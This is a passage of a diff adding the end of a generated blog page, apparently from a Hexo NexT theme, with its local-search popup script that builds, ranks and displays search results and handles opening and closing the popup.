+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
